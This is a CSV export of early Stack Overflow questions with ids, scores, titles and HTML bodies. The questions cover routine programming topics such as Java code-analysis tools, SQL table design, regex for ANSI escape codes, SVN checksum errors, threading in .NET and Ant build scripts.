Id,OwnerUserId,Score,Title,Body
4080,235,92,What code analysis tools do you use for your Java projects?,"<p>What code analysis tools do you use on your Java projects?</p>

<p>I am interested in all kinds</p>

<ul>
<li>static code analysis tools (FindBugs, PMD, and any others)</li>
<li>code coverage tools (Cobertura, Emma, and any others)</li>
<li>any other instrumentation-based tools </li>
<li>anything else, if I'm missing something</li>
</ul>

<p>If applicable, also state what build tools you use and how well these tools integrate with both your IDEs and build tools. </p>

<p>If a tool is only available a specific way (as an IDE plugin, or, say, a build tool plugin) that information is also worth noting.</p>
"
4110,369,7,What program can I use to generate diagrams of SQL view/table structure?,"<p>I've been tasked with redesigning part of a ms-sql database structure which currently involves a lot of views, some of which contain joins to other views. </p>

<p>Anyway, I wonder if anyone here could recommend a utility to automatically generate diagrams to help me visualise the whole structure.</p>

<p>What's the best program you've used for such problems?</p>
"
4170,NA,9,How to learn ADO.NET,"<p>I need to learn ADO.NET to build applications based on MS Office. I have read a good deal about ADO.NET in the MSDN Library, but everything seems rather messy to me.</p>

<p>What are the basics one must figure out when using ADO.NET? I think a few key words will suffice to let me organize my learning.</p>
"
4230,392,34,The Difference Between a DataGrid and a GridView in ASP.NET?,"<p>I've been doing ASP.NET development for a little while now, and I've used both the GridView and the DataGrid controls before for various things, but I never could find a really good reason to use one or the other. I'd like to know:</p>

<p>What is the difference between these 2 ASP.NET controls? What are the advantages or disadvantages of both? Is one any faster? Newer? Easier to maintain?</p>

<p>The intellisense summary for the controls doesn't seem to describe any difference between the two. They both can view, edit, and sort data and automatically generate columns at runtime.</p>

<p><strong>Edit:</strong> Visual Studio 2008 no longer lists DataGrid as an available control in the toolbox. It is still available (for legacy support I assume) if you type it in by hand though.</p>"
4320,1525924,2,ASP.Net 2.0 Application without Business Logic Layer?,"<p>Is it ""acceptable"" to have an <strong>ASP.Net 2.0</strong> application without the BLL (Business Logic Layer) as the following?</p>

<ol>
<li>SQL Server Data Storage &amp; Stored Procedures</li>
<li>Data Link Layer (Strongly Typed Table Adapters) connecting to Stored Procs</li>
<li>Presentation Layer ASPX Pages with Code behind and ObjectDataSource for connection straight to the DLL</li>
</ol>

<p>Is a BLL always preferable, even if business logic is entirely validatable in the presentation's code behind?  What are the potential drawbacks for not using a BLL?</p>
"
4430,349,46,How to easily consume a web service from PHP,"<p>Is there available any tool for PHP which can be used to generate code for consuming a <a href=""http://en.wikipedia.org/wiki/Web_service"">web service</a> based on its <a href=""http://en.wikipedia.org/wiki/Web_Services_Description_Language"">WSDL</a>? Something comparable to clicking ""Add Web Reference"" in Visual Studio or the Eclipse plugin which does the same thing for Java.</p>
"
4610,383,11,How can I create Prototype Methods (like JavaScript) in C#.Net?,"<p>How is it possible to make prototype methods in C#.Net?</p>

<p>In JavaScript, I can do the following to create a trim method for the string object:</p>

<pre><code>String.prototype.trim = function() {
    return this.replace(/^\s+|\s+$/g,"""");
}
</code></pre>

<p>How can I go about doing this in C#.Net?</p>
"
4630,287,8,"How can I Java webstart multiple, dependent, native libraries?","<p>Example: I have two shared objects (same should apply to .dlls). The first shared object is from a third-party library, we'll call it libA.so. I have wrapped some of this with JNI and created my own library, libB.so. Now libB depends on libA.</p>

<p>When webstarting, both libraries are places in some webstart working area. My java code attempts to load libB. At this point the system loader will attempt to load libA which is not in the system library path (java.library.path won't help this). The end result is that libB has an unsatisfied link and cannot be used. </p>

<p>I have tried loading libA before libB, but that still does not work. Seems the OS wants to do that loading for me. Is there any way I can make this work other than statically  compiling?</p>"
4670,634,15,DVCS Choices - What's good for Windows?,"<p>So I want to get a project on a distributed version control system, such as mercurial, git, or bazaar.  The catch is that I need the Windows support to be good, i.e. no instructions that start off with ""install cygwin..."".  Now I've <em>heard</em> that git's Windows support is decent these days, but don't have any first hand experience.  Also, it sounds like the bazaar team has an explicit goal of making it as multiplatform as possible.
Can I get any recommendations?</p>"
4850,41,16,C# and Arrow Keys,"<p>I am new to C# and am doing some work in an existing application. I have a DirectX viewport that has components in it that I want to be able to position using arrow keys.</p>

<p>Currently I am overriding ProcessCmdKey and catching arrow input and send an OnKeyPress event. This works, but I want to be able to use modifiers(<strong><kbd>ALT</kbd>+<kbd>CTRL</kbd>+<kbd>SHIFT</kbd></strong>). As soon as I am holding a modifier and press an arrow no events are triggered that I am listening to.</p>

<p>Does anyone have any ideas or suggestions on where I should go with this?</p>
"
4860,661,8,Authoritative source on XML-sig,"<p>We have a question with regards to XML-sig and need detail about the optional elements as well as some of the canonicalization and transform stuff.  We're writing a spec for a very small XML-syntax payload that will go into the metadata of media files and it needs to by cryptographically signed.  Rather than re-invent the wheel, We thought we should use the XML-sig spec but I think most of it is overkill for what we need, and so we like to have more information/dialogue with people who know the details.</p>

<p>Specifically, do we need to care about either transforms or canonicalization if the XML is very basic with no tabs for formatting and is specific to our needs?</p>
"
4870,483,11,Why is this regular expression faster?,"<p>I'm writing a Telnet client of sorts in C# and part of what I have to parse are ANSI/VT100 escape sequences, specifically, just those used for colour and formatting (detailed <a href=""http://www.termsys.demon.co.uk/vtansi.htm#colors"">here</a>).</p>

<p>One method I have is one to find all the codes and remove them, so I can render the text without any formatting if needed:</p>

<pre><code>    
public static string StripStringFormating(string formattedString)
{
    if (rTest.IsMatch(formattedString))
        return rTest.Replace(formattedString, string.Empty);
    else
        return formattedString;
}
</code></pre>

<p>I'm new to regular expressions and I was suggested to use this:</p>

<pre><code>static Regex rText = new Regex(@""\e\[[\d;]+m"", RegexOptions.Compiled);</code></pre>

<p>However, this failed if the escape code was incomplete due to an error on the server. So then this was suggested, but my friend warned it might be slower (this one also matches another condition (z) that I might come across later):</p>

<pre><code>static Regex rTest = 
              new Regex(@""(\e(\[([\d;]*[mz]?))?)?"", RegexOptions.Compiled);</code></pre>

<p>This not only worked, but was in fact faster to and reduced the impact on my text rendering. Can someone explain to a regexp newbie, why? :)</p>
"
4880,323,22,"Is a ""Confirm Email"" input good practice when user changes email address?","<p>My organization has a form to allow users to update their email address with us.
It's suggested that we have two input boxes for email: the second as an email confirmation.</p>

<p>I always copy/paste my email address when faced with the confirmation.
I'm assuming most of our users are not so savvy.</p>

<p>Regardless, is this considered a good practice?
I can't stand it personally, but I also realize it probably isn't meant for me.
If someone screws up their email, they can't login, and they must call to sort things out.</p>"
4930,668,11,How to reference to multiple version assembly,"<p>I'm developing a Sharepoint application and use .NET AjaxControlToolkit library, we are adding a custom aspx page to the Sharepoint. Sharepoint 2007 run in quirks mode so I've made some modification to the AJAX library to make it behave like it normally should. The problem is, the other team already use AJAX library and it is a different version with mine. This cause conflict because there could be only one dll in the bin folder with the same name.</p>

<p>From what I know, .NET should be able to handle this situation easily. I've tried using strong name and GAC to solve it, but it still refer to the dll in the bin folder. If there is no AjaxControlToolkit.dll in the bin folder, the application will simply fail to load the assembly. </p>

<p>If I use complete assembly information on my like this </p>

<pre><code>&lt;%@ <br>    Register <br>    tagprefix=""AjaxControlToolkit""<br>    namespace=""AjaxControlToolkit""<br>    assembly=""AjaxControlToolkit, Version=1.0.299.18064, <br>    PublicKeyToken=12345678abcdefgh, <br>    Culture=neutral""<br>%&gt;<br></code></pre>

<p>It gives me Compiler Error CS0433</p>

<p>Can someone help me on how to use multiple version of assembly in an application?</p>"
5170,383,90,SQL Server Management Studio alternatives to browse/edit tables and run queries,"<p>I was wondering if there are any alternatives to Microsoft's SQL Server Management Studio?</p>

<p>Not there's anything wrong with SSMS, but sometimes it just seem too big an application where all I want todo is browse/edit tables and run queries.</p>
"
5260,106,4,What is the best way to wrap time around the work day?,"<p>I have a situation where I want to add hours to a date and have the new date wrap around the work-day. I cobbled up a function to determine this new date, but want to make sure that I'm not forgetting anything.</p>

<p>The hours to be added is called ""delay"". It could easily be a parameter to the function instead.</p>

<p>Please post any suggestions. [VB.NET Warning]</p>

<pre><code>Private Function GetDateRequired() As Date
    ''// A decimal representation of the current hour
    Dim hours As Decimal = Decimal.Parse(Date.Now.Hour) + (Decimal.Parse(Date.Now.Minute) / 60.0) 

    Dim delay As Decimal = 3.0           ''// delay in hours
    Dim endOfDay As Decimal = 12.0 + 5.0 ''// end of day, in hours
    Dim startOfDay As Decimal = 8.0      ''// start of day, in hours

    Dim newHour As Integer
    Dim newMinute As Integer

    Dim dateRequired As Date = Now
    Dim delta As Decimal = hours + delay

    ''// Wrap around to the next day, if necessary
    If delta &gt; endOfDay Then
        delta = delta - endOfDay
        dateRequired = dateRequired.AddDays(1)

        newHour = Integer.Parse(Decimal.Truncate(delta))
        newMinute = Integer.Parse(Decimal.Truncate((delta - newHour) * 60))
        newHour = startOfDay + newHour
    Else
        newHour = Integer.Parse(Decimal.Truncate(delta))
        newMinute = Integer.Parse(Decimal.Truncate((delta - newHour) * 60))
    End If

    dateRequired = New Date(dateRequired.Year, dateRequired.Month, dateRequired.Day, newHour, newMinute, 0)

    Return dateRequired
End Sub
</code></pre>

<p><strong>Note</strong>: This will probably not work if delay is more than 9 hours long. It should never change from 3, through.</p>

<p>EDIT:
The goal is find the date and time that you get as a result of adding several hours to the current time. This is used to determine a default value for a due date of a submission. I want to add 3 hours to the current time to get the due date time. However, I don't want due dates that go beyond 5pm on the current day. So, I tried to have the hours split between (today, up to 5pm) and (tomorrow, from 8am on), such that adding 3 hours to 4pm would give you 19am, because 1 hour is added to the end of today and 2 hours are added to the beginning of tomorrow.</p>
"
5460,590,3,Telligent's Community Server,"<p>The company I work for is wanting to add blog functionality to our website and they were looking to spend an awful amount of money to have some crap being built on top of a CMS they purchased (sitecore).  I pointed them to Telligent's Community Server and  we had a sales like meeting today to get the Marketing folks on board. 
My question is if anyone has had issues working with Community Server, skinning it and extending it?<br>
I wanted to explain a bit why I am thinking Community Server, the company is wanting multiple blogs with multiple authors.  I want to be out of the admin part of this as much as possible and didn't think there were too many engines that having multiple blogs didn't mean db work.  I also like the other functionality that Community Server provides and think the company will find it useful, particularly the media section as right now we have some really shotty way of dealing with whitepapers and stuff.</p>

<p>edit: We are actually using the Sitecore blog module for a single blog on our intranet (which is actually what the CMS is serving).  Some reasoning for why I don't like it for our public site are they are on different servers, it doesn't support multiple authors, there is no built in syndication, it is a little flimsy feeling to me from looking at the source and I personally think the other features of Community Server make its price tag worth it.</p>

<p>another edit: Need to stick to .net software that run on sql server in my company's case, but I don't mind seeing recommendations for others.  ExpressionEngine looks promising, will try it out on my personal box.</p>"
5600,615,37,Tables with no Primary Key,"<p>I have several tables whose only unique data is a uniqueidentifier (a Guid) column. Because guids are non-sequential (and they're client-side generated so I can't use newsequentialid()), I have made a non-primary, non-clustered index on this ID field rather than giving the tables a clustered primary key.</p>

<p>I'm wondering what the performance implications are for this approach. I've seen some people suggest that tables should have an auto-incrementing (""identity"") int as a clustered primary key even if it doesn't have any meaning, as it means that the database engine itself can use that value to quickly look up a row instead of having to use a bookmark.</p>

<p>My database is merge-replicated across a bunch of servers, so I've shied away from identity int columns as they're a bit hairy to get right in replication.</p>

<p>What are your thoughts? Should tables have primary keys? Or is it ok to not have any clustered indexes if there are no sensible columns to index that way?</p>
"
5690,364,2,MVC Preview 4 - No route in the route table matches the supplied values,"<p>I have a route that I am calling through a RedirectToRoute like this:</p>

<pre><code>return this.RedirectToRoute(""Super-SuperRoute"", new { year = selectedYear });
</code></pre>

<p>I have also tried:</p>

<pre><code> return this.RedirectToRoute(""Super-SuperRoute"", new { controller = ""Super"", action = ""SuperRoute"", id = ""RouteTopic"", year = selectedYear });
</code></pre>

<p>The route in the global.asax is like this:</p>

<pre><code>routes.MapRoute(
    ""Super-SuperRoute"", // Route name
    ""Super.mvc/SuperRoute/{year}"",  // URL with parameters
     new { controller = ""Super"", action = ""SuperRoute"", id = ""RouteTopic"" }  // Parameter defaults
);
</code></pre>

<p>So why do I get the error: ""No route in the route table matches the supplied values.""?</p>

<p>I saw that the type of selectedYear was var.  When I tried to convert to int with int.Parse I realised that selectedYear was actually null, which would explain the problems.  I guess next time I'll pay more attention to the values of the variables at a breakpoint :)</p>
"
5880,721,6,Are there any negative reasons to use an N-Tier solution?,"<p>I'm pretty new to my company (2 weeks) and we're starting a new platform for our system using .NET 3.5 Team Foundation from DotNetNuke. Our ""architect"" is suggesting we use one class project. Of course, I chime back with a ""3-tier"" architecture (Business, Data, Web class projects). </p>

<p>Is there any disadvantages to using this architecture? Pro's would be separation of code from data, keeping class objects away from your code, etc.</p>"
6080,758,14,What to use for login ID?,"<p>We are in the early design stages of a major rewrite of our product. Right now our customers are mostly businesses. We manage accounts. User names for an account are each on their own namespace but it means that we can't move assets between servers.</p>

<p>We want to move to a single namespace. But that brings the problem of unique user names.</p>

<p>So what's the best idea?</p>

<ul>
<li>Email address (w/verification) ?</li>
<li>Unique alpha-numeric string (""johnsmith9234"")?</li>
<li>Should we look at OpenID?</li>
</ul>"
6110,754,3,Normalizing a Table with Low Integrity,"<p>I've been handed a table with about 18000 rows. Each record describes the location of one customer. The issue is, that when the person created the table, they did not add a field for ""Company Name"", only ""Location Name,"" and one company can have many locations.</p>

<p>For example, here are some records that describe the same customer:</p>

<p><strong>Location Table</strong></p>

<pre><code> ID  Location_Name     
 1   TownShop#1        
 2   Town Shop - Loc 2 
 3   The Town Shop     
 4   TTS - Someplace   
 5   Town Shop,the 3   
 6   Toen Shop4        
</code></pre>

<p>My goal is to make it look like:</p>

<p><strong>Location Table</strong></p>

<pre><code> ID  Company_ID   Location_Name     
 1   1            Town Shop#1       
 2   1            Town Shop - Loc 2 
 3   1            The Town Shop     
 4   1            TTS - Someplace   
 5   1            Town Shop,the 3   
 6   1            Toen Shop4        
</code></pre>

<p><strong>Company Table</strong></p>

<pre><code> Company_ID  Company_Name  
 1           The Town Shop 
</code></pre>

<p>There is no ""Company"" table, I will have to generate the Company Name list from the most descriptive or best Location Name that represents the multiple locations.</p>

<p>Currently I am thinking I need to generate a list of Location Names that are similar, and then and go through that list by hand.</p>

<p>Any suggestions on how I can approach this is appreciated.</p>

<p><strong>@Neall, Thank you for your statement, but unfortunately, each location name is distinct, there are no duplicate location names, only similar. So in the results from your statement ""repcount"" is 1 in each row.</strong></p>

<p><strong>@yukondude, Your step 4 is the heart of my question.</strong></p>
"
6130,763,56,Repair SVN Checksum,"<p>I'm using subclipse in Flex Builder 3, and recently received this error when trying to commit:</p>

<p><code>svn: Checksum mismatch for '/Users/redacted/Documents/Flex Builder 3/path/to/my/file.mxml'; expected: 'f8cb275de72776657406154dd3c10348', actual: 'null'</code></p>

<p>I worked around it by:</p>

<ol>
<li>Committing all the other changed files, omitting the troublesome one.</li>
<li>Copying the contents of the trouble file to a TextMate window</li>
<li>Deleting my project in FlexBuilder/Eclipse</li>
<li>Checking my project out fresh from SVN</li>
<li>Copying the text of the trouble file back in from the TextMate Window</li>
<li>Committing the changes.</li>
</ol>

<p>It worked, but I can't help but think there's a better way. What's actaully happening to cause the svn:checksum error, and what's the best fix.</p>

<p>Maybe more important -- is this a symptom of a greater problem?</p>
"
6210,721,0,E-mail Notifications,"<p>In a .net system I'm building, there is a need for automated e-mail notifications. These should be editable by an admin. What's the easiest way to do this? SQL table and WYSIWIG for editing?</p>

<hr>

<p>The queue is a great idea. I've been throwing around that type of process for awhile with my old company.</p>
"
6340,58,10,Multiple foreign keys?,"<p>I've got a table that is supposed to track days and costs for shipping product from one vendor to another. We (brilliantly :p) stored both the shipping vendors (FedEx, UPS) with the product handling vendors (Think... Dunder Mifflin) in a ""VENDOR"" table. So, I have three columns in my SHIPPING_DETAILS table that all reference VENDOR.no. For some reason MySQL isn't letting me define all three as foreign keys. Any ideas?</p>

<pre><code>CREATE TABLE SHIPPING_GRID(  
    id INT NOT NULL AUTO_INCREMENT PRIMARY KEY COMMENT 'Unique ID for each row',  
    shipping_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to VENDOR.no for the shipping vendor (vendors_type must be 3)',  
    start_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to VENDOR.no for the vendor being shipped from',  
    end_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to the VENDOR.no for the vendor being shipped to',  
    shipment_duration INT(1) DEFAULT 1 COMMENT 'Duration in whole days shipment will take',  
    price FLOAT(5,5) NOT NULL COMMENT 'Price in US dollars per shipment lbs (down to 5 decimal places)',  
    is_flat_rate TINYINT(1) DEFAULT 0 COMMENT '1 if is flat rate regardless of weight, 0 if price is by lbs',  
    INDEX (shipping_vendor_no),  
    INDEX (start_vendor_no),  
    INDEX (end_vendor_no),  
    FOREIGN KEY (shipping_vendor_no) REFERENCES VENDOR (no),  
    FOREIGN KEY (start_vendor_no) REFERENCES VENDOR (no),  
    FOREIGN KEY (end_vendor_no) REFERENCES VENDOR (no)  
) TYPE = INNODB;
</code></pre>

<p><em>Edited to remove double primary key definition...</em></p>

<hr>

<p>Yeah, unfortunately that didn't fix it though. Now I'm getting:</p>

<blockquote>
  <p>Can't create table
  './<em>REMOVED MY DB NAME</em>/SHIPPING_GRID.frm'
  (errno: 150)</p>
</blockquote>

<p>Doing a phpinfo() tells me this for mysql:</p>

<blockquote>
  <p>Client API version    5.0.45</p>
</blockquote>

<p>Yes, the VENDOR.no is type int(6).</p>
"
6430,785,3,How to programmatically iterate datagrid rows?,"<p>I'm suddenly back to WinForms, after years of web development, and am having trouble  with something that should be simple.  I have an <code>ArrayList</code> of business objects bound to a  Windows Forms <code>DataGrid</code>.  I'd like the user to be able to edit the cells, and when finished,  press a Save button.  At that point I'd like to iterate the all the rows and columns in the  <code>DataGrid</code> to find any changes, and save them to the database.  But I can't find a way to  access the <code>DataGrid</code> rows.  </p>

<p>I'll also want to validate individual cells real time, as they are edited, but I'm pretty  sure that can be done.  (Maybe not with an <code>ArrayList</code> as the <code>DataSource</code>?)  But as for iterating the <code>DataGrid</code>, I'm quite surprised it doesn't seem possible.</p>

<p>Must I really stuff my business objects data into datatables in order to use the datagrid?  </p>
"
6440,560,17,.NET 3.5 Redistributable -- 200 MB? Other options?,"<P>I've been using a lot of new .NET 3.5 features in the work that I've been doing, lately. The application that I'm building is intended for distribution among consumers who will probably not have the latest version (or perhaps <EM>any version</EM>) of the .NET framework on their machines.</P>
<P>I went to go <A href=""http://www.microsoft.com/downloads/details.aspx?FamilyId=333325FD-AE52-4E35-B531-508D977D32A6&amp;displaylang=en"">download the .NET 3.5 redistributable package</A> only to find out that it's almost <STRONG><EM>200 MB!</EM></STRONG> This is unacceptable for my application, because it's supposed to be a quick and painless consumer application that installs quickly and keeps a low profile on the user's machine. For users that have .NET 3.5 already installed, our binary downloads have been instantaneous, so far. This 200 MB gorilla will more than quadruple the size of the download. Is there any other option than this redistributable package that I can use to make sure the framework is on the machine that won't take the user out of our ""quick and painless"" workflow? Our target time from beginning of download to finalizing the install is less than two minutes. Is it just not possible for someone who doesn't already have .NET installed?</P>"
6530,233,7,Where should I put my log file for an asp.net application?,"<p>I have a ASP.NET application that we've written our own logging module for.</p>

<p>My question is, where is the standard place to write a log file to? I.e. the website will be running as the anonymous user identity (e.g. IUSR on IIS7) and I need a place where I know it'll have permission to write to.</p>

<p>Cheers,</p>
"
6890,636,5,How to wait for thread complete before continuing?,"<p>I have some code for starting a thread on the .NET CF 2.0:</p>

<pre><code>ThreadStart tStart = new ThreadStart(MyMethod);
Thread t = new Thread(tStart);
t.Start();
</code></pre>

<p>If I call this inside a loop the items complete out of order. How do introduce a wait after <code>t.Start()</code>, so that the work on the thread completes before the code continues? Will BeginInvoke/EndInvoke be a better option for this than manually creating threads?</p>
"
7180,274,4,Animation in .NET,"<p>What is a good way to perform animation using .NET?</p>

<p>I would prefer not to use Flash if possible, so am looking for suggestions of ways which will work to implement different types of animation on a new site I am producing.</p>

<p>The new site is for a magician, so I want to provide animated buttons (Cards turning over, etc.) and also embed video.  Is it possible to do this without using Flash or is this the only real solution?  I would like to keep it as cross-platform and standard as possible.</p>
"
7190,371,9,Setting up Continuous Integration with SVN,"<p>What tools would you recommend for setting up CI for build and deployment of multiple websites built on DotNetNuke using SVN for source control? </p>

<p>We are currently looking at configuring Cruise Control to work with NAnt, NUnit, NCover and Trac as a test case. What other combinations would worth investigating?</p>

<p>We have full control of our development environment so using some form of CI is certain here but I would also like to convince our production services team that they can reliably deploy to the system test, uat and even production environments using these tools.</p>
"
7260,889,48,How do I setup Public-Key Authentication?,"<p>How do I setup Public-Key Authentication for SSH?</p>
"
7440,889,31,What do you use to Unit-Test your Web UI?,"<p>The company I'm currently working for is using <a href=""http://selenium.openqa.org/"">Selenium</a> for Uniting-Testing our User Interface. What do you use to Unit-Test your Web UI and how effective do you find it? </p>
"
7470,150,0,RSS feeds from Gallery2,"<p>After a couple hours fighting with the <a href=""http://gallery.menalto.com/"" rel=""nofollow"">Gallery2</a> <a href=""http://codex.gallery2.org/Gallery2:Modules:rss"" rel=""nofollow"">RSS module</a> and getting only the message, ""no feeds have yet been defined"", I gave up.  Based on <a href=""http://www.google.com/search?q=%22no+feeds+have+yet+been+defined%22"" rel=""nofollow"">a Google search for ""no feeds have yet been defined""</a>, this is a pretty common problem.  Do you have any tips and/or tricks for getting the Gallery2 RSS module to work?  Or any tips for a relatively-PHP-ignorant developer trying to debug problems with this PHP application?</p>
"
7540,122,6,Some kind of task manager for JavaScript in Firefox 3?,"<p>Recently I have been having issues with Firefox 3 on Ubuntu Hardy Heron.</p>

<p>I will click on a link and it will hang for a while.  I don't know if its a bug in Firefox 3 or a page running too much client side JavaScript, but I would like to try and debug it a bit.</p>

<p>So, my question is ""is there a way to have some kind of process explorer, or task manager sort of thing for Firefox 3?""</p>

<p>I would like to be able to see what tabs are using what percent of my processor via the JavaScript on that page (or anything in the page that is causing CPU/memory usage).  </p>

<p>Does anybody know of a plugin that does this, or something similar?  Has anyone else done this kind of inspection another way?</p>

<p>I know about FireBug, but I can't imagine how I would use it to finger which tab is using a lot of resources.</p>

<p>Any suggestions or insights?</p>
"
7720,998,33,Packaging Java apps for the Windows/Linux desktop,"<p>I am writing an application in Java for the desktop using the Eclipse SWT library for GUI rendering.  I think SWT helps Java get over the biggest hurdle for acceptance on the desktop: namely providing a Java application with a consistent, responsive interface that looks like that belonging to any other app on your desktop.  However, I feel that packaging an application is still an issue.  </p>

<p>OS X natively provides an easy mechanism for wrapping Java apps in native application bundles, but producing an app for Windows/Linux that doesn't require the user to run an ugly batch file or click on a .jar is still a hassle.  Possibly that's not such an issue on Linux, where the user is likely to be a little more tech-savvy, but on Windows I'd like to have a regular .exe for him/her to run.</p>

<p>Has anyone had any experience with any of the .exe generation tools for Java that are out there?  I've tried JSmooth but had various issues with it.  Is there a better solution before I crack out Visual Studio and roll my own?</p>

<p><strong>Edit:</strong>  I should perhaps mention that I am unable to spend a lot of money on a commercial solution.</p>
"
7880,432,15,How do you open a file in C++?,"<p>I want to open a file for reading, the C++ way. I need to be able to do it for:</p>

<ul>
<li><p>text files, which would involve some sort of read line function.</p></li>
<li><p>binary files, which would provide a way to read raw data into a <code>char*</code> buffer.</p></li>
</ul>
"
7940,428190,8,How important is W3C XHTML/CSS validation when finalizing work?,"<p>Even though I always strive for complete validation these days, I often wonder if it's a waste of time.  If the code runs and it looks the same in all browsers (I use browsershots.org to verify) then do I need to take it any further or am I just being overly anal?</p>

<p>What level do you hold your code to when you create it for:</p>

<p>a) yourself
b) your clients</p>

<p>P.S. Jeff and company, why doesn't stack overflow validate? :)</p>

<p><strong>EDIT: Some good insights, I think that since I've been so valid-obsessed for so long I program knowing what will cause problems and what won't so I'm in a better position than people who create a site first and then ""go back and fix the validation problems""</strong></p>

<p><strong>I think I may post another question on stack overflow; ""Do you validate as you go or do you finish and then go back and validate?"" as that seems to be where this question is going</strong></p>
"
7990,96,19,Printing from a .NET Service,"<p>I am working on a project right now that involves receiving a message from another application, formatting the contents of that message, and sending it to a printer.  Technology of choice is C# windows service.  The output could be called a report, I suppose, but a reporting engine is not necessary.  A simple templating engine, like StringTemplate, or even XSLT outputting HTML would be fine.  The problem I'm having is finding a free way to print this kind of output from a service.  Since it <em>seems</em> that it will work, I'm working on a prototype using Microsoft's RDLC, populating a local report and then rendering it as an image to a memory stream, which I will then print.  Issues with that are:</p>

<ul>
<li>Multi-page printing will be a big headache.</li>
<li>Still have to use PrintDocument to print the memory stream, which is unsupported in a Windows Service (though it may work - haven't gotten that far with the prototype yet)</li>
<li>If the data coming across changes, I have to change the dataset, and the class that the data is being deserialized into.  bad bad bad.</li>
</ul>

<p>Has anyone had to do anything remotely like this?  Any advice?  I already posed a question about printing HTML without user input, and after wasting about 3 days on that, I have come to the conclusion that it cannot be done, at least not with any freely available tool.</p>

<p>All help is appreciated.</p>

<p>EDIT: We are on version 2.0 of the .NET framework.</p>
"
8050,383,35,Beginners Guide to LINQ,"<p>During the beta of Stack Overflow, I have seen quite a few questions about LINQ SQL but know nothing about it... it sounds very interesting.</p>

<p><strong>What is LINQ and how do I get started?</strong></p>

<p>Links guides or documentation a bonus :)</p>

<p><em>PS: I am a long time C# developer who daily uses Datatables and Parameterized SQL</em></p>
"
8140,277,14,Suggestions for Adding Plugin Capability?,"<p>Is there a general procedure for programming extensibility capability into your code?</p>

<p>I am wondering what the general procedure is for adding extension-type capability to a system you are writing so that functionality can be extended through some kind of plugin API rather than having to modify the core code of a system.</p>

<p>Do such things tend to be dependent on the language the system was written in, or is there a general method for allowing for this?</p>
"
8790,292,25,"Ant build scripts, antcall, dependencies, etc","<p>I have a build script and as part of that script it copies a jar file to a directory, for ease lets call it the utils jar.  the utils jar is built by another build script sitting in another directory.  What im trying to do have my build script run the utils build script so that I can ensure the utils jar is up to date.</p>

<p>So I know I need to import the utils build file.</p>

<pre><code>&lt;import file=""../utils/build/build.xml"" /&gt;
</code></pre>

<p>Which doesn't work because the import task, unlike almost every other ant taks, doesn't run from basedir, it runs from the pwd.  So to get around that I have this little ditty, which does successfully import the build file</p>

<pre><code>  &lt;property name=""baseDirUpOne"" location="".."" /&gt;
  &lt;import file=""${baseDirUpOne}/utils/build/build.xml"" /&gt;
</code></pre>

<p>So now that ive solved my import problem I need to call the task, well that should be easy right:</p>

<pre><code>&lt;antcall target=""utils.package"" /&gt;
</code></pre>

<p><em>note that in the above, utils is the project name of ../utils/build/build.xml</em></p>

<p>the problem I'm now running into is that ant call doesn't execute in ../utils/build so what I need, and cant find, is a runat property or something similar, essentially:</p>

<pre><code>&lt;antcall target=""utils.package"" runat=""../utils/build"" /&gt;
</code></pre>

<p>The reason I need this is that in my utils build file the step to select which code to copy to the jar is based on relative paths so as to avoid hardcoding paths in my ant file. Any ideas? </p>
"
8800,61,63,Best implementation for Key Value Pair Data Structure?,"<p>So I've been poking around with C# a bit lately, and all the Generic Collections have me a little confused. Say I wanted to represent a data structure where the head of a tree was a key value pair, and then there is one optional list of key value pairs below that (but no more levels than these). Would this be suitable?</p>

<pre><code>public class TokenTree
{
    public TokenTree()
    {
        /* I must admit to not fully understanding this,
         * I got it from msdn. As far as I can tell, IDictionary is an
         * interface, and Dictionary is the default implementation of
         * that interface, right?
         */
        SubPairs = new Dictionary&lt;string, string&gt;();
    }

    public string Key;
    public string Value;
    public IDictionary&lt;string, string&gt; SubPairs;
}
</code></pre>

<p>It's only really a simple shunt for passing around data.</p>
"
8830,738,0,Not showing Dialog when opening file in Acrobat Pro using Applescript,"<p>When opening Adobe Acrobat Pro, whether it be through <strong>Applescript</strong> or finder, the introductory dialog is shown.  Is there a way to not show this dialog without already having checked the ""Don't Show Again"" option when opening a document using <strong>Applescript</strong>?  </p>

<p>Photoshop and Illustrator <strong>Applescript</strong> libraries have ways of setting interaction levels and not showing dialogs, but I can't seem to find the option in Acrobat.</p>
"
8880,672,0,Get list of domains on the network,"<p>Using the Windows API, how can I get a list of domains on my network?</p>
"
